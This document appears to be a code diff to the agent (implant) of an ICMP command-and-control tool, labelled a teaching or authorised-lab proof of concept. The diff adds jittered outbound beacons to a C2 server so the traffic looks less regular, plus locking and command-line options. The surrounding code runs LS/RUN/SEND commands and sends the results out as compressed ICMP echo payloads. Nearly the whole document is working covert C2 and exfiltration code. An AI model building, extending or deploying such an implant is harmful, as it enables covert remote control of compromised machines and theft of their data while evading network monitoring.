@@ -2,16 +2,19 @@
 """
 agent.py — ICMP C2 agent (teaching / authorised-lab PoC).
 
-Listens for CMD! triggers from the controller; replies with zlib-chunked
-ICMP type-8 streams (START/CHUNK/END), RETRY, and ACK.
+Beacons outbound with optional jitter; sniffs for CMD! triggers; replies with
+zlib-chunked ICMP type-8 streams (START/CHUNK/END), RETRY, and ACK.
 """
 
 from __future__ import annotations
 
 import argparse
 import os
+import random
+import socket
 import subprocess
 import sys
+import threading
 import time
 import zlib
 
@@ -22,10 +25,15 @@ CHUNK_SIZE = 36
 
 INTERFACE = ""
 C2_SERVER_IP = ""
+BEACON_INTERVAL = 5.0
+BEACON_JITTER = 0.3  # fraction of interval (±)
+AGENT_ID = ""
 
 active_stream_name = ""
 cached_chunks_matrix: dict = {}
 busy = False
+_busy_lock = threading.Lock()
+_stop = threading.Event()
 
 
 def transmit_chunk(data_bytes: bytes, sequence_number: int) -> None:
@@ -40,7 +48,8 @@ def transmit_chunk(data_bytes: bytes, sequence_number: int) -> None:
 
 def optimize_and_stream(stream_name: str, raw_data_bytes: bytes) -> None:
     global active_stream_name, cached_chunks_matrix, busy
-    busy = True
+    with _busy_lock:
+        busy = True
     active_stream_name = stream_name
     cached_chunks_matrix = {}
 
@@ -69,6 +78,36 @@ def optimize_and_stream(stream_name: str, raw_data_bytes: bytes) -> None:
         iface=INTERFACE,
         verbose=False,
     )
+
+
+def send_beacon() -> None:
+    load = TRIGGER_MARKER + f"BEACON|{AGENT_ID}".encode()
+    pkt = (
+        IP(dst=C2_SERVER_IP)
+        / ICMP(type=8, id=0xC200, seq=0)
+        / Raw(load=load)
+    )
+    send(pkt, iface=INTERFACE, verbose=False)
+
+
+def _next_beacon_sleep() -> float:
+    """Base interval ± jitter fraction (teaching: avoid metronomic beacons)."""
+    if BEACON_JITTER <= 0:
+        return BEACON_INTERVAL
+    delta = BEACON_INTERVAL * BEACON_JITTER
+    return max(1.0, BEACON_INTERVAL + random.uniform(-delta, delta))
+
+
+def beacon_loop() -> None:
+    while not _stop.is_set():
+        with _busy_lock:
+            is_busy = busy
+        if not is_busy:
+            try:
+                send_beacon()
+            except Exception:
+                pass
+        _stop.wait(_next_beacon_sleep())
 
 
 def parse_trigger(packet) -> None:
@@ -117,10 +156,13 @@ def parse_trigger(packet) -> None:
 
     if action == "ACK":
         cached_chunks_matrix, active_stream_name = {}, ""
-        busy = False
+        with _busy_lock:
+            busy = False
         return
 
-    if busy and action in ("LS", "RUN", "SEND"):
+    with _busy_lock:
+        is_busy = busy
+    if is_busy and action in ("LS", "RUN", "SEND"):
         return
 
     if action == "LS":
@@ -168,13 +210,30 @@ def parse_args():
     ap.add_argument(
         "--iface",
         default=os.environ.get("ICMP_C2_IFACE"),
-        help="Sniff/send interface, e.g. eth0 or ens5 (or env ICMP_C2_IFACE)",
+        help="Sniff/send interface, e.g. eth0 or wlp8s0 (or env ICMP_C2_IFACE)",
+    )
+    ap.add_argument(
+        "--beacon-interval",
+        type=float,
+        default=float(os.environ.get("ICMP_C2_BEACON", "5")),
+        help="Base seconds between outbound BEACON (default 5)",
+    )
+    ap.add_argument(
+        "--jitter",
+        type=float,
+        default=float(os.environ.get("ICMP_C2_JITTER", "0.3")),
+        help="Jitter as fraction of interval, e.g. 0.3 = ±30%% (default 0.3)",
+    )
+    ap.add_argument(
+        "--agent-id",
+        default=os.environ.get("ICMP_C2_AGENT_ID") or socket.gethostname(),
+        help="Id string in BEACON|<id> (default: hostname)",
     )
     return ap.parse_args()
 
 
 def main() -> None:
-    global INTERFACE, C2_SERVER_IP
+    global INTERFACE, C2_SERVER_IP, BEACON_INTERVAL, BEACON_JITTER, AGENT_ID
 
     args = parse_args()
     if os.geteuid() != 0:
@@ -187,9 +246,19 @@ def main() -> None:
         )
     C2_SERVER_IP = args.server
     INTERFACE = args.iface
+    BEACON_INTERVAL = max(1.0, args.beacon_interval)
+    BEACON_JITTER = max(0.0, min(args.jitter, 0.9))
+    AGENT_ID = args.agent_id
 
-    print(f"[*] Agent online on {INTERFACE}; C2={C2_SERVER_IP}. Sniffing ICMP...")
-    sniff(iface=INTERFACE, filter="icmp", prn=parse_trigger, store=0)
+    print(
+        f"[*] Agent online on {INTERFACE}; C2={C2_SERVER_IP}; "
+        f"beacon={BEACON_INTERVAL}s jitter=±{BEACON_JITTER:.0%} id={AGENT_ID}"
+    )
+    threading.Thread(target=beacon_loop, daemon=True).start()
+    try:
+        sniff(iface=INTERFACE, filter="icmp", prn=parse_trigger, store=0)
+    finally:
+        _stop.set()
 
 
 if __name__ == "__main__":
